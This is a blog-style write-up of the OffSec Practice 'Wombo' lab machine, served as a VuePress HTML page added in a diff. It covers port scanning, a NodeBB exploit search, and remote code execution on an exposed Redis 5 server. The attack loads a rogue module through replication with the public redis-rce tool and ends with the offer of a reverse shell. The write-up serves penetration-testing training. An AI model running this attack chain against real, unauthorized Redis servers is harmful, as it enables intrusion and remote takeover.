@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Wombo | 0x4vian | </title>
+    <meta name="generator" content="VuePress 1.8.2">
+    <link rel="icon" href="/logo.png">
+    <meta name="description" content="Official Website">
+    
+    <link rel="preload" href="/assets/css/0.styles.f119ea2f.css" as="style"><link rel="preload" href="/assets/js/app.69131adc.js" as="script"><link rel="preload" href="/assets/js/2.c3593e62.js" as="script"><link rel="preload" href="/assets/js/16.cea4bcc0.js" as="script"><link rel="prefetch" href="/assets/js/10.308f3211.js"><link rel="prefetch" href="/assets/js/11.3b663562.js"><link rel="prefetch" href="/assets/js/12.a49cad18.js"><link rel="prefetch" href="/assets/js/13.65c24f1e.js"><link rel="prefetch" href="/assets/js/14.7c23ea23.js"><link rel="prefetch" href="/assets/js/15.d509ebbb.js"><link rel="prefetch" href="/assets/js/17.97661b68.js"><link rel="prefetch" href="/assets/js/3.f2fda5b1.js"><link rel="prefetch" href="/assets/js/4.cac33d60.js"><link rel="prefetch" href="/assets/js/5.f2b75204.js"><link rel="prefetch" href="/assets/js/6.9002bb66.js"><link rel="prefetch" href="/assets/js/7.ad4444df.js"><link rel="prefetch" href="/assets/js/8.5f4ae7d7.js"><link rel="prefetch" href="/assets/js/9.5da3ac53.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.f119ea2f.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">0x4vian | </span></a> <div class="links"><!----> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
+  Home
+</a></div><div class="nav-item"><a href="/about/" class="nav-link">
+  About
+</a></div><div class="nav-item"><a href="/certs/" class="nav-link">
+  Certifications
+</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
+  Blog
+</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
+  Home
+</a></div><div class="nav-item"><a href="/about/" class="nav-link">
+  About
+</a></div><div class="nav-item"><a href="/certs/" class="nav-link">
+  Certifications
+</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
+  Blog
+</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Blog</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog/wombo.html" aria-current="page" class="active sidebar-link">Wombo</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog/wombo.html#summary" class="sidebar-link">Summary</a></li><li class="sidebar-sub-header"><a href="/blog/wombo.html#initial-foothold" class="sidebar-link">Initial Foothold</a></li><li class="sidebar-sub-header"><a href="/blog/wombo.html#geting-shell" class="sidebar-link">Geting Shell</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="wombo">Wombo</h1> <p>OFFSEC Praactice Warm UP Machine</p> <h2 id="summary">Summary</h2> <table><thead><tr><th>Box Name</th> <th>IP</th></tr></thead> <tbody><tr><td>WOMBO</td> <td>192.168.199.69</td></tr></tbody></table> <h2 id="initial-foothold">Initial Foothold</h2> <p>Lets start by doing the nmap scan of the box</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nmap -sV -sT -sC -o nmapinitial <span class="token number">192.168</span>.199.69
+PORT     STATE  SERVICE    VERSION
+<span class="token number">22</span>/tcp   <span class="token function">open</span>   <span class="token function">ssh</span>        OpenSSH <span class="token number">7</span>.4p1 Debian <span class="token number">10</span>+deb9u7 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">2048</span> 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">83</span>:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">53</span>/tcp   closed domain
+<span class="token number">80</span>/tcp   <span class="token function">open</span>   http       nginx <span class="token number">1.10</span>.3
+<span class="token operator">|</span>_http-server-header: nginx/1.10.3
+<span class="token operator">|</span>_http-title: Welcome to nginx<span class="token operator">!</span>
+<span class="token number">8080</span>/tcp <span class="token function">open</span>   http-proxy
+<span class="token operator">|</span> http-robots.txt: <span class="token number">3</span> disallowed entries 
+<span class="token operator">|</span>_/admin/ /reset/ /compose
+<span class="token operator">|</span>_http-title: Home <span class="token operator">|</span> NodeBB
+
+
+</code></pre></div><p>Port <code>80</code> and <code>8080</code> is open lets visit these ports and in background lets run full port scan for the box.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nmap -p- <span class="token number">192.168</span>.199.69 -o nmap-fullscan
+</code></pre></div><h3 id="port-8080">Port 8080</h3> <p>Let's start with port 8080 because it has interesting file <code>robots.txt</code></p> <p><code>robots.txt</code> shows three interesting files</p> <div class="language-docs extra-class"><pre class="language-text"><code>├── /admin/
+├── /reset/
+├── /compose
+</code></pre></div><p>Upon visting the site we found it is using <code>NodeBB</code>. Let's check for any existing exploits using searchsploit.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ searchsploit NodeBB       
+-------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                      <span class="token operator">|</span>  Path
+-------------------------------------------------------------------- ---------------------------------
+NodeBB Forum <span class="token number">1.12</span>.2-1.14.2 - Account Takeover                       <span class="token operator">|</span> multiple/webapps/48875.txt
+NodeBB Plugin Emoji <span class="token number">3.2</span>.1 - Arbitrary File Write                    <span class="token operator">|</span> multiple/webapps/49813.py
+-------------------------------------------------------------------- ---------------------------------
+</code></pre></div><p>Searchsploit gave two results but the <code>NodeBB</code> doesn't seem to be vulnerable to both of them.</p> <p>Let's move on to another port to see anything interesting.</p> <h3 id="nmap-full-port-scan">Nmap Full Port Scan</h3> <p>We got results from Nmap port scan. Before moving to port <code>80</code> Let's see if we get some other interesting ports which can be exploited easily.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nmap -p- <span class="token number">192.168</span>.199.69 -o nmap-fullscan
+Not shown: <span class="token number">65529</span> filtered ports
+PORT      STATE  SERVICE
+<span class="token number">22</span>/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>
+<span class="token number">53</span>/tcp    closed domain
+<span class="token number">80</span>/tcp    <span class="token function">open</span>   http
+<span class="token number">6379</span>/tcp  <span class="token function">open</span>   redis
+<span class="token number">8080</span>/tcp  <span class="token function">open</span>   http-proxy
+<span class="token number">27017</span>/tcp <span class="token function">open</span>   mongod
+</code></pre></div><p><code>Port 6379</code> is open. It looks like easy target. Let's try to exploit it.</p> <h3 id="port-6379-redis">Port 6379 -  Redis</h3> <p>First lets install redis-cli in our machine.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> redis-tools
+</code></pre></div><p>Connecting to redis server</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ redis-cli -h <span class="token number">192.168</span>.199.69
+<span class="token number">192.168</span>.199.69:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span>
+</code></pre></div><p>We are now connected to redis server.
+Now, if we read Redis' security page, we will come across the following statement.</p> <p>“Internally, Redis uses all the well known practices for writing secure code, to prevent buffer overflows, format bugs and other memory corruption issues. However, the ability to control the server configuration using the CONFIG command makes the client able to change the working dir of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to compromise the system and/or run untrusted code as the same user as Redis is running.”</p> <p>Which simply mean we can achieve RCE from this.</p> <h2 id="geting-shell">Geting Shell</h2> <p>First lets connect to redis server</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ redis-cli -h <span class="token number">192.168</span>.199.69
+<span class="token number">192.168</span>.199.69:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span>
+</code></pre></div><p>Get the redis version by using <code>INFO</code> command</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">192.168</span>.199.69:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> INFO
+<span class="token comment"># Server</span>
+redis_version:5.0.9
+
+</code></pre></div><p>The redis versio is 5.x so we can use Redis master-slave replication to get shell. For this we have to generate malicious .so file and exploit the machine.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">git</span> clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+$ <span class="token builtin class-name">cd</span> RedisModules-ExecuteCommand/
+$ <span class="token function">make</span>
+</code></pre></div><p>Now lets use the module.so file to get shell on server</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">git</span> clone https://github.com/Ridter/redis-rce.git
+$ <span class="token builtin class-name">cd</span> redis-rce/
+$ <span class="token function">cp</span> <span class="token punctuation">..</span>/RedisModules-ExecuteCommand/src/module.so ./
+$ pip <span class="token function">install</span> -r requirements.txt 
+$ python redis-rce.py -r <span class="token number">192.168</span>.28.152 -p <span class="token number">6379</span> -L <span class="token number">192.168</span>.28.137 -P <span class="token number">8080</span> -f module.so
+</code></pre></div><div class="language-bash extra-class"><pre class="language-bash"><code>$ python redis-rce.py -r <span class="token number">192.168</span>.199.69 -L <span class="token number">192.168</span>.49.199 --lport <span class="token number">8080</span> -f module.so   
+
+█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
+█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
+█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
+█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
+  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
+ ▀                                     ▀                   
+
+s
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Connecting to  <span class="token number">192.168</span>.199.69:6379<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending SLAVEOF <span class="token builtin class-name">command</span> to server
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Accepted connection from <span class="token number">192.168</span>.199.69:6379
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting filename
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Accepted connection from <span class="token number">192.168</span>.199.69:6379
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Start listening on <span class="token number">192.168</span>.49.199:8080
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tring to run payload
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Accepted connection from <span class="token number">192.168</span>.199.69:32799
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closing rogue server<span class="token punctuation">..</span>.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> What <span class="token keyword">do</span> u want ? <span class="token punctuation">[</span>i<span class="token punctuation">]</span>nteractive shell or <span class="token punctuation">[</span>r<span class="token punctuation">]</span>everse shell or <span class="token punctuation">[</span>e<span class="token punctuation">]</span>xit: 
+
+</code></pre></div><p>Press r and get reverse shell 😃</p> <p>Happy Hacking ....</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.69131adc.js" defer></script><script src="/assets/js/2.c3593e62.js" defer></script><script src="/assets/js/16.cea4bcc0.js" defer></script>
+  </body>
+</html>
